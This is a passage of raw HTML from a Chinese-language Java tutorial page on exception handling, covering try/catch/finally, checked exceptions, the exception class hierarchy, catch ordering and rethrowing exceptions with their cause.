&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="异常处理">异常处理&lt;/h2>
&lt;h3 id="异常捕获异常">异常&amp;amp;捕获异常&lt;/h3>
&lt;ul>
&lt;li>Java内置异常处理机制，是一种&lt;code>class&lt;/code>，本身带有类型信息；异常可以在任何地方抛出，但只需要在上层捕获，这样可以做到和方法调用分离&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>try {
String s = processFile(“C:\\test.txt”);
// ok:
} catch (FileNotFoundException e) {
// file not found:
} catch (SecurityException e) {
// no read permission:
} catch (IOException e) {
// io error:
} catch (Exception e) {
// other error:
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>继承关系是这样的&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227002539516.png" alt="image-20220227002539516">&lt;/p>
&lt;p>&lt;code>Throwable&lt;/code>是异常体系的根，它继承自&lt;code>Object&lt;/code>&lt;/p>
&lt;p>&lt;code>Error&lt;/code>表示严重错误，比如&lt;code>OutofMemoryError&lt;/code>, &lt;code>NoClassDefFoundError&lt;/code>, &lt;code>StackOverflowError&lt;/code>&lt;/p>
&lt;p>&lt;code>Exception&lt;/code>表示运行时的异常，可以被捕获并处理，比如&lt;code>NumberFormatException&lt;/code>, &lt;code>FileNotFoundException&lt;/code>, &lt;code>SocketException&lt;/code>；还包括一些可修正的语法错误，比如&lt;code>NullPointerException&lt;/code>, &lt;code>IndexOutOfBoundsException&lt;/code>&lt;/p>
&lt;ul>
&lt;li>常用异常&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-ascii" data-lang="ascii">Exception
│
├─ RuntimeException
│ │
│ ├─ NullPointerException
│ │
│ ├─ IndexOutOfBoundsException
│ │
│ ├─ SecurityException
│ │
│ └─ IllegalArgumentException
│ │
│ └─ NumberFormatException
│
├─ IOException
│ │
│ ├─ UnsupportedCharsetException
│ │
│ ├─ FileNotFoundException
│ │
│ └─ SocketException
│
├─ ParseException
│
├─ GeneralSecurityException
│
├─ SQLException
│
└─ TimeoutException
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>必须捕获的异常，包括&lt;code>Exception&lt;/code>及其子类，但不包括&lt;code>RuntimeException&lt;/code>及其子类，这种类型的异常称为Checked Exception&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果不捕获Checked Exception，编译器会报错，原因是方法定义时使用&lt;code>throws Xxx&lt;/code>表示该方法可能抛出的异常类型，导致调用方在调用的时候，必须强制捕获这些异常&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不需要捕获的异常，包括&lt;code>Error&lt;/code>及其子类，&lt;code>RuntimeException&lt;/code>及其子类&lt;/p>
&lt;/li>
&lt;li>
&lt;p>捕获异常需要提前import&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;中文&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 用指定编码转换String为byte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>只要是方法声明的Checked Exception，不在调用层捕获，也必须在更高的调用层捕获；所有未捕获的异常，最终也必须在&lt;code>main()&lt;/code>方法中捕获&lt;/li>
&lt;li>所有异常都可以调用&lt;code>printStackTrace()&lt;/code>方法打印异常栈&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 先记下来再说:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果不想用try可以直接把&lt;code>main()&lt;/code>方法定义为&lt;code>throws Exception&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;中文&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 用指定编码转换String为byte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>相当于声明了所有可能抛出的Exception，也就不用捕获了；代价就是一旦发生异常，程序会立刻退出，不够灵活&lt;/p>
&lt;ul>
&lt;li>当方法声明了可能抛出的异常，可以没有&lt;code>catch&lt;/code>，只使用&lt;code>try ... finally&lt;/code>结构&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;END&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>可以一个try对多个catch，此时注意catch的顺序：子类在前，避免短路&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process3&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IO error&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 永远捕获不到 会被上面的截胡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bad encoding&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="抛出异常">抛出异常&lt;/h3>
&lt;ul>
&lt;li>分两步：创建某个&lt;code>Exception&lt;/code>的实例 -&amp;gt; 抛出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果一个方法捕获了某个异常后，又在&lt;code>catch&lt;/code>子句中抛出新的异常，就相当于把抛出的异常类型“转换”了；注意为了能追踪到完整的异常栈，在构造异常的时候，把原始的&lt;code>Exception&lt;/code>实例传进去&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 01
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 05
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process1&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 02
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NullPointerException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// throw new IllegalArgumentException();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 04
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 03
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果用注释掉的方式写就会丢失&lt;code>NullPointerException&lt;/code>这一条&lt;/p>
&lt;ul>
&lt;li>在代码中获取原始异常可以使用&lt;code>Throwable.getCause()&lt;/code>方法。如果返回&lt;code>null&lt;/code>，说明已经是“根异常”了(Caused by: xxxx)&lt;/li>
